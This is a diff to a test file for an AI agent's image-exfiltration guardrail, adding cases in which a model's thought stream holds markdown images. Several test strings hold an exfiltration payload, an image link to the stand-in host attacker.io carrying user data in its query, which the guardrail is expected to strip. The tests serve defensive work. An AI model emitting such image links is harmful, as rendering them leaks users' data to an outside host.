@@ -6,6 +6,7 @@
 import '../fixtures/test-host.ts';
 import { z } from 'zod';
 import { EGRESS_RULES, standardEgressEnforce } from '../../src/guardrails/egress.ts';
+import { OMIT_IMAGE } from '../../src/guardrails/thought-guard.ts';
 import {
   registerProfile,
   registerTool,
@@ -87,6 +88,9 @@ async function run(provider: ModelProvider, request: Partial<TurnRequest> = {}) 
     text: eventsOf(events, 'text')
       .map((e) => e.text ?? '')
       .join(''),
+    thought: eventsOf(events, 'thought')
+      .map((e) => e.text ?? '')
+      .join(''),
     imageBlocked,
   };
 }
@@ -116,7 +120,26 @@ Deno.test('image exfil: a URL the model wrote itself earlier in the turn is not 
   assertEquals([imageBlocked, text.includes('![p]')], [true, false]);
 });
 
-async function liveReply(reply: string): Promise<{ text: string; imageBlocked: boolean }> {
+Deno.test('image exfil: a thought loading an unseen image loses it, and the turn goes on', async () => {
+  const provider: ModelProvider = {
+    async *complete() {
+      yield { type: 'thought', text: 'Maybe ![p](https://attacker.io/p?d=alice) helps. ' };
+      yield { type: 'thought', text: `Or ![photo](https://brand.site/logo.png).` };
+      yield { type: 'text', text: 'Done.' };
+    },
+  };
+  const { text, thought, imageBlocked } = await run(provider);
+  assertEquals(
+    [imageBlocked, text, thought.includes('attacker.io'), thought.includes(OMIT_IMAGE)],
+    [false, 'Done.', false, true],
+  );
+  assertEquals(thought.includes('![photo](https://brand.site/logo.png)'), true);
+});
+
+async function liveReply(
+  reply: string,
+  thought?: string,
+): Promise<{ text: string; thought: string; imageBlocked: boolean }> {
   const profile = defineProfile({
     type: 'live',
     id: 'image_exfil_live',
@@ -153,6 +176,8 @@ async function liveReply(reply: string): Promise<{ text: string; imageBlocked: b
   });
   await until(() => events.some((e) => e.type === 'tool'));
   await session.executeTool({ callId: 'c1' });
+  if (thought)
+    live.deliver({ serverContent: { modelTurn: { parts: [{ text: thought, thought: true }] } } });
   live.deliver({ serverContent: { modelTurn: { parts: [{ text: reply }] } } });
   live.deliver({ serverContent: { outputTranscription: { text: `said ${reply}` } } });
   live.deliver({ serverContent: { turnComplete: true } });
@@ -162,6 +187,9 @@ async function liveReply(reply: string): Promise<{ text: string; imageBlocked: b
   await drain.catch(() => undefined);
   return {
     text: eventsOf(events, 'text')
+      .map((e) => e.text ?? '')
+      .join(''),
+    thought: eventsOf(events, 'thought')
       .map((e) => e.text ?? '')
       .join(''),
     imageBlocked: eventsOf(events, 'guardrail').some((e) =>
@@ -175,4 +203,13 @@ Deno.test('image exfil: a Live reply and its transcript render an image a tool r
   assertEquals([shown.imageBlocked, shown.text.includes(PHOTO)], [false, true]);
   const leaked = await liveReply('![p](https://attacker.io/p?d=alice)');
   assertEquals([leaked.imageBlocked, leaked.text.includes('attacker.io')], [true, false]);
+});
+
+Deno.test('image exfil: a Live thought loading an unseen image loses it, and the reply goes on', async () => {
+  const shown = await liveReply('All set.', 'Try ![p](https://attacker.io/p?d=alice) first. ');
+  assertEquals(
+    [shown.imageBlocked, shown.text.includes('All set.'), shown.thought.includes('attacker.io')],
+    [false, true, false],
+  );
+  assertEquals(shown.thought.includes(OMIT_IMAGE), true);
 });
